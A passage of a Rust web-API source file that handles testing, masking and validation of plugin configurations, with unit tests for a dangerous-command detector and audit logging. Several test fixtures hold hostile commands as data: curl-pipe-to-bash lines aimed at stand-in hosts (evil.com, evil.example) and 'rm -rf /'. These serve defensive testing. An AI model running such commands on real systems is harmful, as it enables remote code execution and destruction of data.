            .collect(),
    };

    (StatusCode::OK, Json(response)).into_response()
}

/// Test a plugin configuration without saving it.
///
/// Validates the plugin type, merges with an optional saved config, checks
/// for dangerous command patterns, then routes to the appropriate test path:
///
/// - **Controller-side** (plugins with `ControllerSideFetchReleases`):
///   validates config structure and returns success immediately.
/// - **Agent-side** (all others): requires `host_id`, resolves the host to a
///   connected service, sends a `TestPluginConfig` wire message, and waits for
///   the result (30 s timeout).
#[utoipa::path(
    post,
    path = "/api/v1/plugin-configs/test",
    extensions(("x-required-permission" = json!("test_plugin_configs"))),
    request_body = TestPluginConfigRequest,
    responses(
        (status = 200, description = "Test result", body = TestPluginConfigResponse),
        (status = 400, description = "Invalid request"),
        (status = 404, description = "Host or plugin config not found"),
        (status = 502, description = "Agent did not respond"),
    ),
    tag = "Plugin Configs",
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn test_plugin_config(
    State(state): State<Arc<AppState>>,
    tenant_db: TenantDb,
    CanTestPluginConfigs(_user): CanTestPluginConfigs,
    Validated(body): Validated<TestPluginConfigRequest>,
) -> Response {
    // 1. Validate plugin type is known and supports per-instance plugin configs.
    let plugin_type_id = PluginTypeId::new(&body.plugin_type);
    if let Some(rejection) = reject_config_model_none_plugin_type(&state, &plugin_type_id) {
        return rejection;
    }
    let caps = state.plugin_ops.capabilities(&plugin_type_id);

    // 2. Merge with saved config if plugin_config_id is provided.
    let config = if let Some(config_id) = body.plugin_config_id {
        let saved = match PluginConfig::find_by_id(config_id)
            .filter(plugin_config::Column::TenantId.eq(tenant_db.tenant_id))
            .filter(plugin_config::Column::DeactivatedAt.is_null())
            .one(tenant_db.db())
            .await
        {
            Ok(Some(c)) => c,
            Ok(None) => {
                return error_response(StatusCode::NOT_FOUND, "Plugin config not found");
            }
            Err(e) => {
                tracing::error!("DB error loading plugin config: {e}");
                return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
            }
        };
        // Shallow-merge incoming config on top of saved config.
        let mut merged = saved.config.clone();
        if let (Some(base), Some(overlay)) = (merged.as_object_mut(), body.config.as_object()) {
            for (k, v) in overlay {
                base.insert(k.clone(), v.clone());
            }
        }
        merged
    } else {
        body.config.clone()
    };

    // 3. Validate merged config.
    if let Err(e) = state.plugin_ops.validate_config(&plugin_type_id, &config) {
        return error_response(
            StatusCode::BAD_REQUEST,
            format!("Invalid plugin config: {e}"),
        );
    }

    // 4. Reject dangerous commands if enabled.
    if state.reject_dangerous_commands {
        let matches = collect_dangerous_patterns(&config);
        if !matches.is_empty() {
            return error_response(
                StatusCode::BAD_REQUEST,
                format_dangerous_pattern_rejection(&matches),
            );
        }
    }

    // 5. Determine test kind from capabilities.
    let is_controller_side = caps.contains(&PluginCapability::ControllerSideFetchReleases);

    if is_controller_side {
        // Controller-side test: config validation is sufficient. The plugin
        // fetches releases from external APIs on the controller, so a
        // successful config validation means the config is structurally valid.
        let mut resp = TestPluginConfigResponse::new(true, "connectivity".to_string(), 0);
        resp.output = Some("Plugin configuration is valid".to_string());
        return (StatusCode::OK, Json(resp)).into_response();
    }

    // Agent-side test: host_id is required.
    let host_id = match body.host_id {
        Some(id) => id,
        None => {
            return error_response(
                StatusCode::BAD_REQUEST,
                "host_id is required for agent-side plugin tests",
            );
        }
    };

    // 6. Resolve host → service.
    let host_record = match Host::find_by_id(host_id)
        .filter(host::Column::TenantId.eq(tenant_db.tenant_id))
        .filter(host::Column::DeactivatedAt.is_null())
        .one(tenant_db.db())
        .await
    {
        Ok(Some(h)) => h,
        Ok(None) => return error_response(StatusCode::NOT_FOUND, "Host not found"),
        Err(e) => {
            tracing::error!("DB error: {e}");
            return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
        }
    };

    let service_id = match load_active_agent_service_for_host(&tenant_db, host_id).await {
        Ok(service) => service.id,
        Err(resp) => return resp,
    };

    // 7. Determine test kind.
    let test_kind_str = body.test_kind.as_deref().unwrap_or("version_detection");
    let test_kind = match test_kind_str {
        "version_detection" => uptrakit_internal_wire::ConfigTestKind::VersionDetection,
        "update_command_validation" => {
            uptrakit_internal_wire::ConfigTestKind::UpdateCommandValidation
        }
        "pre_update_hook" => uptrakit_internal_wire::ConfigTestKind::PreUpdateHook,
        "post_update_hook" => uptrakit_internal_wire::ConfigTestKind::PostUpdateHook,
        "connectivity" => uptrakit_internal_wire::ConfigTestKind::Connectivity,
        _ => {
            return error_response(
                StatusCode::BAD_REQUEST,
                format!("Unknown test_kind: {test_kind_str}"),
            );
        }
    };

    // 8. Build payload and invoke via proxy.
    let request_id = Uuid::now_v7().to_string();
    let mut payload = uptrakit_internal_wire::TestPluginConfigPayload::new(
        request_id,
        host_record.machine_id.clone(),
        test_kind,
        body.plugin_type.clone(),
        config,
    );
    payload.package_identifier = body.package_identifier.clone();

    let timeout = std::time::Duration::from_secs(30);
    match state
        .config_test_proxy
        .invoke(&state.service_connections, &service_id, payload, timeout)
        .await
    {
        Ok(result) => {
            let mut resp = TestPluginConfigResponse::new(
                result.success,
                test_kind_str.to_string(),
                result.duration_ms,
            );
            resp.output = result.output;
            resp.error = result.error;
            resp.detected_version = result.detected_version;
            (StatusCode::OK, Json(resp)).into_response()
        }
        Err(ConfigTestProxyError::Timeout) => error_response(
            StatusCode::GATEWAY_TIMEOUT,
            "Agent did not respond within the timeout",
        ),
        Err(ConfigTestProxyError::ServiceDisconnected) => {
            error_response(StatusCode::BAD_GATEWAY, "Agent disconnected during test")
        }
        Err(ConfigTestProxyError::SendFailed) => error_response(
            StatusCode::BAD_GATEWAY,
            "Failed to send test request to agent",
        ),
    }
}

#[cfg(test)]
mod tests {
    #[cfg(feature = "db-sqlite")]
    use super::batch_plugin_configs;
    #[cfg(feature = "db-sqlite")]
    use super::create_plugin_config;
    #[cfg(feature = "db-sqlite")]
    use super::delete_plugin_config;
    use super::plugin_field_to_api_field;
    #[cfg(feature = "db-sqlite")]
    use super::update_plugin_config;
    #[cfg(feature = "db-sqlite")]
    use crate::AppState;
    #[cfg(feature = "db-sqlite")]
    use crate::auth::AuthMethod;
    #[cfg(feature = "db-sqlite")]
    use crate::auth::permissions::Permission;
    #[cfg(feature = "db-sqlite")]
    use crate::extract::Validated;
    #[cfg(feature = "db-sqlite")]
    use crate::middleware::permission::CanManageCommands;
    #[cfg(feature = "db-sqlite")]
    use crate::middleware::require_auth::{AuthenticatedApiTokenId, AuthenticatedUser};
    #[cfg(feature = "db-sqlite")]
    use crate::tenant_db::TenantDb;
    #[cfg(feature = "db-sqlite")]
    use axum::{
        Extension, Json,
        extract::{Path, State},
        http::StatusCode,
        response::IntoResponse,
    };
    #[cfg(feature = "db-sqlite")]
    use sea_orm::{ColumnTrait, ConnectionTrait, EntityTrait, QueryFilter, QueryOrder};
    use serde_json::json;
    #[cfg(feature = "db-sqlite")]
    use std::sync::Arc;
    use uptrakit_plugin_infrastructure_registry::{CatalogConfig, PluginConfigOps, build_catalog};
    #[cfg(feature = "db-sqlite")]
    use uptrakit_shared_db::entity::{audit_log, plugin_config, prelude::PluginConfig};
    use uptrakit_shared_types::PluginTypeId;
    #[cfg(feature = "db-sqlite")]
    use uptrakit_web_api_types::batch_actions::BatchActionRequest;
    #[cfg(feature = "db-sqlite")]
    use uptrakit_web_api_types::plugin_configs::{
        CreatePluginConfigRequest, UpdatePluginConfigRequest,
    };
    use uptrakit_web_api_types::plugin_configs::{
        FieldType as ApiFieldType, SelectSource as ApiSelectSource,
    };

    fn catalog() -> impl PluginConfigOps {
        build_catalog(&CatalogConfig::default()).expect("default catalog should build")
    }

    /// Sentinel value used to indicate a masked secret in API responses.
    const SECRET_MASK: &str = "***";

    #[test]
    fn plugin_field_conversion_preserves_json_shape_and_semantics() {
        let plugin_field = json!({
            "key": "mode",
            "label": "Mode",
            "field_type": "future_picker",
            "required": true,
            "placeholder": "Choose mode",
            "help_text": "Used for forward-compatible field types",
            "default_value": {
                "mode": "smart",
                "limits": [1, 2, 3],
                "nested": {"flag": true}
            },
            "options": [{"value": "smart", "label": "Smart"}],
            "select_source": {"type": "action", "action_id": "demo.fetch-modes"},
            "sensitive": true,
            "list": true,
            "visible_when": {"field": "provider", "values": ["custom"]}
        });

        let api_field = plugin_field_to_api_field(plugin_field);
        assert_eq!(
            api_field.field_type,
            ApiFieldType::Other("future_picker".to_string())
        );
        assert_eq!(
            api_field.default_value,
            Some(json!({
                "mode": "smart",
                "limits": [1, 2, 3],
                "nested": {"flag": true}
            }))
        );
        assert_eq!(api_field.options.len(), 1);
        assert_eq!(
            api_field.select_source,
            Some(ApiSelectSource::Action {
                action_id: "demo.fetch-modes".to_string()
            })
        );
        assert_eq!(
            api_field
                .visible_when
                .expect("visible_when should be preserved")
                .field,
            "provider"
        );
        assert!(api_field.sensitive);
        assert!(api_field.list);
    }

    #[test]
    fn mask_github_auth_token() {
        let config = serde_json::json!({
            "auth_token": "ghp_secret123"
        });
        let masked =
            catalog().mask_config_secrets(&PluginTypeId::from_static("releases_github"), &config);
        assert_eq!(masked["auth_token"], SECRET_MASK);
    }

    #[test]
    fn mask_null_token_becomes_masked() {
        let config = serde_json::json!({
            "auth_token": null
        });
        let masked =
            catalog().mask_config_secrets(&PluginTypeId::from_static("releases_github"), &config);
        // with_secrets_masked always sets auth_token to "***"
        assert_eq!(masked["auth_token"], SECRET_MASK);
    }

    #[test]
    fn mask_without_token_field_adds_masked() {
        let config = serde_json::json!({});
        let masked =
            catalog().mask_config_secrets(&PluginTypeId::from_static("releases_github"), &config);
        // with_secrets_masked always adds auth_token as "***"
        assert_eq!(masked["auth_token"], SECRET_MASK);
    }

    #[test]
    fn mask_unknown_plugin_type() {
        let config = serde_json::json!({"key": "value"});
        let masked =
            catalog().mask_config_secrets(&PluginTypeId::from_static("unknown_type"), &config);
        assert_eq!(masked, config);
    }

    #[test]
    fn restore_masked_token() {
        let mut incoming = serde_json::json!({"auth_token": "***"});
        let existing = serde_json::json!({"auth_token": "ghp_real_token"});
        catalog().restore_config_secrets(
            &PluginTypeId::from_static("releases_github"),
            &mut incoming,
            &existing,
        );
        assert_eq!(incoming["auth_token"], "ghp_real_token");
    }

    #[test]
    fn restore_new_token_not_masked() {
        let mut incoming = serde_json::json!({"auth_token": "ghp_new_token"});
        let existing = serde_json::json!({"auth_token": "ghp_old_token"});
        catalog().restore_config_secrets(
            &PluginTypeId::from_static("releases_github"),
            &mut incoming,
            &existing,
        );
        assert_eq!(incoming["auth_token"], "ghp_new_token");
    }

    #[test]
    fn validate_valid_github_config() {
        let config = serde_json::json!({});
        assert!(
            catalog()
                .validate_config(&PluginTypeId::from_static("releases_github"), &config)
                .is_ok()
        );
    }

    #[test]
    fn validate_invalid_github_config() {
        // Non-https api_base_url fails validation.
        let config = serde_json::json!({"api_base_url": "http://api.github.com"});
        assert!(
            catalog()
                .validate_config(&PluginTypeId::from_static("releases_github"), &config)
                .is_err()
        );
    }

    #[test]
    fn validate_unknown_plugin_type() {
        let config = serde_json::json!({});
        assert!(
            catalog()
                .validate_config(&PluginTypeId::from_static("nonexistent"), &config)
                .is_err()
        );
    }

    #[test]
    fn parse_known_plugin_types() {
        let github_config = serde_json::json!({});
        assert!(
            catalog()
                .validate_config(
                    &PluginTypeId::from_static("releases_github"),
                    &github_config
                )
                .is_ok()
        );

        let proxmox_config = serde_json::json!({
            "script_url": "https://example.com/update.sh"
        });
        assert!(
            catalog()
                .validate_config(
                    &PluginTypeId::from_static("discovery_proxmox_helper_scripts"),
                    &proxmox_config
                )
                .is_ok()
        );

        let docker_config = serde_json::json!({});
        assert!(
            catalog()
                .validate_config(
                    &PluginTypeId::from_static("releases_docker"),
                    &docker_config
                )
                .is_ok()
        );

        let homebrew_config = serde_json::json!({});
        assert!(
            catalog()
                .validate_config(
                    &PluginTypeId::from_static("package_manager_homebrew"),
                    &homebrew_config
                )
                .is_ok()
        );

        assert!(
            catalog()
                .validate_config(&PluginTypeId::from_static("unknown"), &homebrew_config)
                .is_err()
        );
    }

    #[cfg(feature = "dashboard-icons")]
    #[test]
    fn dashboard_icons_exposes_type_settings_via_plugin_types_metadata() {
        let plugin_type = PluginTypeId::from_static("enhancement_dashboard_icons");
        let form_fields = catalog()
            .type_settings_form_schema(&plugin_type)
            .expect("dashboard icons should expose type settings");
        assert_eq!(form_fields.len(), 1);
        assert_eq!(form_fields[0].key, "enabled");

        let sample = catalog().type_settings_sample(&plugin_type);
        assert_eq!(sample, serde_json::json!({ "enabled": true }));
    }

    // --- Homebrew plugin tests ---

    #[test]
    fn validate_valid_homebrew_config() {
        let config = serde_json::json!({});
        assert!(
            catalog()
                .validate_config(
                    &PluginTypeId::from_static("package_manager_homebrew"),
                    &config
                )
                .is_ok()
        );
    }

    #[test]
    fn validate_homebrew_config_with_cask() {
        let config = serde_json::json!({"package_type": "cask"});
        assert!(
            catalog()
                .validate_config(
                    &PluginTypeId::from_static("package_manager_homebrew"),
                    &config
                )
                .is_ok()
        );
    }

    #[test]
    fn mask_homebrew_config_unchanged() {
        let config = serde_json::json!({"package_type": "formula"});
        let masked = catalog().mask_config_secrets(
            &PluginTypeId::from_static("package_manager_homebrew"),
            &config,
        );
        // No secrets to mask — config returned unchanged
        assert_eq!(masked, config);
    }

    // --- Docker plugin tests ---

    #[test]
    fn mask_docker_basic_password() {
        let config = serde_json::json!({
            "auth": {
                "type": "basic",
                "username": "user",
                "password": "secret123"
            }
        });
        let masked =
            catalog().mask_config_secrets(&PluginTypeId::from_static("releases_docker"), &config);
        assert_eq!(masked["auth"]["password"], SECRET_MASK);
        assert_eq!(masked["auth"]["username"], "user");
    }

    #[test]
    fn mask_docker_bearer_token() {
        let config = serde_json::json!({
            "auth": {
                "type": "bearer",
                "token": "ghcr_token_secret"
            }
        });
        let masked =
            catalog().mask_config_secrets(&PluginTypeId::from_static("releases_docker"), &config);
        assert_eq!(masked["auth"]["token"], SECRET_MASK);
    }

    #[test]
    fn mask_docker_no_auth() {
        let config = serde_json::json!({});
        let masked =
            catalog().mask_config_secrets(&PluginTypeId::from_static("releases_docker"), &config);
        // None auth stays absent (serialized with skip_serializing_if)
        assert!(masked.get("auth").is_none());
    }

    #[test]
    fn mask_docker_null_auth() {
        let config = serde_json::json!({ "auth": null });
        let masked =
            catalog().mask_config_secrets(&PluginTypeId::from_static("releases_docker"), &config);
        // JSON null deserializes to None, which stays absent after masking
        assert!(masked.get("auth").is_none());
    }

    #[test]
    fn restore_docker_masked_password() {
        let mut incoming = serde_json::json!({
            "auth": {
                "type": "basic",
                "username": "user",
                "password": "***"
            }
        });
        let existing = serde_json::json!({
            "auth": {
                "type": "basic",
                "username": "user",
                "password": "real_password"
            }
        });
        catalog().restore_config_secrets(
            &PluginTypeId::from_static("releases_docker"),
            &mut incoming,
            &existing,
        );
        assert_eq!(incoming["auth"]["password"], "real_password");
    }

    #[test]
    fn restore_docker_masked_token() {
        let mut incoming = serde_json::json!({
            "auth": {
                "type": "bearer",
                "token": "***"
            }
        });
        let existing = serde_json::json!({
            "auth": {
                "type": "bearer",
                "token": "real_token"
            }
        });
        catalog().restore_config_secrets(
            &PluginTypeId::from_static("releases_docker"),
            &mut incoming,
            &existing,
        );
        assert_eq!(incoming["auth"]["token"], "real_token");
    }

    #[test]
    fn restore_docker_new_password_not_masked() {
        let mut incoming = serde_json::json!({
            "auth": {
                "type": "basic",
                "username": "user",
                "password": "new_password"
            }
        });
        let existing = serde_json::json!({
            "auth": {
                "type": "basic",
                "username": "user",
                "password": "old_password"
            }
        });
        catalog().restore_config_secrets(
            &PluginTypeId::from_static("releases_docker"),
            &mut incoming,
            &existing,
        );
        assert_eq!(incoming["auth"]["password"], "new_password");
    }

    #[test]
    fn validate_valid_docker_config() {
        // Empty config is valid — no required fields
        let config = serde_json::json!({});
        assert!(
            catalog()
                .validate_config(&PluginTypeId::from_static("releases_docker"), &config)
                .is_ok()
        );
    }

    #[test]
    fn validate_docker_config_with_auth() {
        let config = serde_json::json!({
            "tracked_tag": "main",
            "auth": {
                "type": "bearer",
                "token": "ghcr_token"
            }
        });
        assert!(
            catalog()
                .validate_config(&PluginTypeId::from_static("releases_docker"), &config)
                .is_ok()
        );
    }

    #[test]
    fn validate_docker_config_old_semver_fields_are_ignored() {
        // Configs stored before the digest-tracking refactor may contain
        // tracking_mode / tag_patterns / page_size — they must be silently ignored.
        let config = serde_json::json!({
            "tracking_mode": "semver_tags",
            "tag_patterns": ["^v[0-9]+"],
            "page_size": 500
        });
        assert!(
            catalog()
                .validate_config(&PluginTypeId::from_static("releases_docker"), &config)
                .is_ok(),
            "old semver fields should be silently ignored"
        );
    }

    // ── detect_command_fields tests ──────────────────────────────────────

    use super::detect_command_fields;

    #[test]
    fn detect_shell_config_command_fields() {
        let config = serde_json::json!({
            "version_command": "dpkg -l | grep foo",
            "update_command": "apt-get install -y foo"
        });
        let fields = detect_command_fields(&config);
        assert!(fields.contains(&"version_command"));
        assert!(fields.contains(&"update_command"));
        assert_eq!(fields.len(), 2);
    }

    #[test]
    fn detect_docker_post_pull_command() {
        let config = serde_json::json!({
            "post_pull_command": "docker-compose up -d"
        });
        let fields = detect_command_fields(&config);
        assert_eq!(fields, vec!["post_pull_command"]);
    }

    #[test]
    fn detect_structured_hooks() {
        let config = serde_json::json!({
            "hooks": {
                "pre_update": {
                    "commands": ["systemctl stop myapp"]
                },
                "post_update": {
                    "commands": ["systemctl start myapp"]
                }
            }
        });
        let fields = detect_command_fields(&config);
        assert!(fields.contains(&"hooks.pre_update.commands"));
        assert!(fields.contains(&"hooks.post_update.commands"));
        assert_eq!(fields.len(), 2);
    }

    #[test]
    fn detect_legacy_hook_commands() {
        let config = serde_json::json!({
            "pre_update_commands": ["stop-service"],
            "post_update_commands": ["start-service"]
        });
        let fields = detect_command_fields(&config);
        assert!(fields.contains(&"pre_update_commands"));
        assert!(fields.contains(&"post_update_commands"));
        assert_eq!(fields.len(), 2);
    }

    #[test]
    fn detect_no_command_fields() {
        let config = serde_json::json!({
            "tracked_tag": "latest",
            "auth": { "type": "bearer", "token": "tok" }
        });
        let fields = detect_command_fields(&config);
        assert!(fields.is_empty());
    }

    #[test]
    fn detect_null_command_fields_excluded() {
        let config = serde_json::json!({
            "version_command": null,
            "update_command": "apt-get update"
        });
        let fields = detect_command_fields(&config);
        assert_eq!(fields, vec!["update_command"]);
    }

    #[test]
    fn detect_non_object_config_returns_empty() {
        let config = serde_json::json!("not an object");
        let fields = detect_command_fields(&config);
        assert!(fields.is_empty());
    }

    #[test]
    fn detect_empty_hooks_commands_excluded() {
        let config = serde_json::json!({
            "hooks": {
                "pre_update": {
                    "commands": []
                }
            }
        });
        let fields = detect_command_fields(&config);
        assert!(fields.is_empty(), "empty commands array should be excluded");
    }

    // ── collect_dangerous_patterns tests ──────────────────────────────

    use super::collect_dangerous_patterns;
    use super::format_dangerous_pattern_rejection;

    #[test]
    fn collect_dangerous_curl_pipe_bash() {
        let config = serde_json::json!({
            "version_command": "curl https://evil.com/payload | bash"
        });
        let matches = collect_dangerous_patterns(&config);
        assert!(!matches.is_empty());
        assert!(matches[0].field == "version_command");
        assert!(matches[0].description.contains("remote script"));
    }

    #[test]
    fn collect_dangerous_hook_commands() {
        let config = serde_json::json!({
            "hooks": {
                "pre_update": {
                    "commands": ["rm -rf /"]
                }
            }
        });
        let matches = collect_dangerous_patterns(&config);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].field, "hooks.pre_update.commands[0]");
        assert!(matches[0].description.contains("recursive delete"));
    }

    #[test]
    fn collect_no_dangerous_patterns_benign() {
        let config = serde_json::json!({
            "version_command": "dpkg -l | grep nginx",
            "update_command": "apt-get install -y nginx"
        });
        let matches = collect_dangerous_patterns(&config);
        assert!(matches.is_empty());
    }

    #[test]
    fn collect_non_object_returns_empty() {
        let config = serde_json::json!("not an object");
        let matches = collect_dangerous_patterns(&config);
        assert!(matches.is_empty());
    }

    #[test]
    fn format_rejection_message() {
        let matches = vec![super::DangerousPatternMatch {
            field: "version_command".to_string(),
            description: "pipe remote script to shell",
        }];
        let msg = format_dangerous_pattern_rejection(&matches);
        assert!(msg.contains("dangerous command patterns"));
        assert!(msg.contains("version_command"));
        assert!(msg.contains("pipe remote script to shell"));
    }

    #[cfg(feature = "db-sqlite")]
    async fn latest_tenant_audit_row(
        db: &sea_orm::DatabaseConnection,
        action_type: &'static str,
    ) -> audit_log::Model {
        for _ in 0..50 {
            if let Some(row) = audit_log::Entity::find()
                .filter(audit_log::Column::ActionType.eq(action_type))
                .order_by_desc(audit_log::Column::OccurredAt)
                .one(db)
                .await
                .expect("query tenant audit rows")
            {
                return row;
            }

            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }

        panic!("expected tenant audit row for action_type={action_type}");
    }

    #[cfg(feature = "db-sqlite")]
    fn audit_details(row: &audit_log::Model) -> serde_json::Value {
        row.details_json
            .clone()
            .expect("audit row should contain details_json")
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn create_plugin_config_denied_dangerous_commands_writes_denied_audit_event() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
        let mut state = match Arc::try_unwrap(state) {
            Ok(state) => state,
            Err(_) => panic!("expected unique app state in this unit test"),
        };
        state.reject_dangerous_commands = true;
        let state = Arc::new(state);

        let actor_user_id = uuid::Uuid::now_v7();
        let actor_token_id = uuid::Uuid::now_v7();
        let response = match create_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            Some(Extension(AuthenticatedApiTokenId(actor_token_id))),
            Validated(CreatePluginConfigRequest {
                name: "Denied Dangerous Config".to_string(),
                plugin_type: PluginTypeId::from_static("generic_shell"),
                config: serde_json::json!({
                    "version_command": "curl https://evil.example/install.sh | bash"
                }),
                enabled: true,
            }),
        )
        .await
        {
            Ok(response) => response.into_response(),
            Err(_) => panic!("handler returned ApiError unexpectedly"),
        };

        assert_eq!(response.status(), StatusCode::BAD_REQUEST);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Denied.as_str()
        );
        assert_eq!(
            row.actor_type,
            uptrakit_audit_log::AuditActorType::ApiToken.as_str()
        );
        assert_eq!(row.actor_id, Some(actor_token_id));
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn create_plugin_config_success_persists_command_risk_details() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let actor_user_id = uuid::Uuid::now_v7();
        let response = match create_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(CreatePluginConfigRequest {
                name: "Risky Config".to_string(),
                plugin_type: PluginTypeId::from_static("generic_shell"),
                config: serde_json::json!({
                    "version_command": "curl https://evil.example/install.sh | bash"
                }),
                enabled: true,
            }),
        )
        .await
        {
            Ok(response) => response.into_response(),
            Err(_) => panic!("handler returned ApiError unexpectedly"),
        };

        assert_eq!(response.status(), StatusCode::CREATED);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Success.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(details["contains_command_fields"], serde_json::json!(true));
        assert_eq!(
            details["command_fields"],
            serde_json::json!(["version_command"])
        );
        assert_eq!(
            details["dangerous_command_match_count"],
            serde_json::json!(1)
        );
        assert_eq!(
            details["dangerous_matches"][0]["field"],
            serde_json::json!("version_command")
        );
        assert!(
            !details
                .to_string()
                .contains("https://evil.example/install.sh"),
            "semantic audit details must not store raw command content"
        );
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn update_plugin_config_success_persists_command_risk_details() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let actor_user_id = uuid::Uuid::now_v7();
        let create_response = match create_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(CreatePluginConfigRequest {
                name: "Update Risk Seed".to_string(),
                plugin_type: PluginTypeId::from_static("generic_shell"),
                config: serde_json::json!({ "version_command": "echo v1.0.0" }),
                enabled: true,
            }),
        )
        .await
        {
            Ok(response) => response.into_response(),
            Err(_) => panic!("create handler returned ApiError unexpectedly"),
        };
        assert_eq!(create_response.status(), StatusCode::CREATED);

        let created = PluginConfig::find()
            .filter(plugin_config::Column::TenantId.eq(tenant_id))
            .filter(plugin_config::Column::Name.eq("Update Risk Seed"))
            .filter(plugin_config::Column::DeactivatedAt.is_null())
            .order_by_desc(plugin_config::Column::CreatedAt)
            .one(&db)
            .await
            .expect("query created plugin config")
            .expect("created plugin config row");

        let update_response = match update_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            Path(created.id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Json(UpdatePluginConfigRequest {
                name: Some("Update Risk Applied".to_string()),
                config: Some(serde_json::json!({
                    "version_command": "curl https://evil.example/install.sh | bash"
                })),
                enabled: Some(true),
            }),
        )
        .await
        {
            Ok(response) => response.into_response(),
            Err(_) => panic!("update handler returned ApiError unexpectedly"),
        };
        assert_eq!(update_response.status(), StatusCode::OK);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_UPDATE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Success.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(details["contains_command_fields"], serde_json::json!(true));
        assert_eq!(
            details["command_fields"],
            serde_json::json!(["version_command"])
        );
        assert_eq!(
            details["dangerous_command_match_count"],
            serde_json::json!(1)
        );
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn delete_plugin_config_success_persists_command_risk_details() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let actor_user_id = uuid::Uuid::now_v7();
        let create_response = match create_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(CreatePluginConfigRequest {
                name: "Delete Risk Seed".to_string(),
                plugin_type: PluginTypeId::from_static("generic_shell"),
                config: serde_json::json!({
                    "version_command": "curl https://evil.example/install.sh | bash"
                }),
                enabled: true,
            }),
        )
        .await
        {
            Ok(response) => response.into_response(),
            Err(_) => panic!("create handler returned ApiError unexpectedly"),
        };
        assert_eq!(create_response.status(), StatusCode::CREATED);

        let created = PluginConfig::find()
            .filter(plugin_config::Column::TenantId.eq(tenant_id))
            .filter(plugin_config::Column::Name.eq("Delete Risk Seed"))
            .filter(plugin_config::Column::DeactivatedAt.is_null())
            .order_by_desc(plugin_config::Column::CreatedAt)
            .one(&db)
            .await
            .expect("query created plugin config")
            .expect("created plugin config row");

        let delete_response = delete_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            Path(created.id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
        )
        .await;
        assert_eq!(delete_response.status(), StatusCode::NO_CONTENT);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Success.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(details["contains_command_fields"], serde_json::json!(true));
        assert_eq!(
            details["command_fields"],
            serde_json::json!(["version_command"])
        );
        assert_eq!(
            details["dangerous_command_match_count"],
            serde_json::json!(1)
        );
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn delete_plugin_config_not_found_writes_denied_audit_event() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let actor_user_id = uuid::Uuid::now_v7();
        let missing_id = uuid::Uuid::now_v7();
        let response = delete_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            Path(missing_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
        )
        .await;
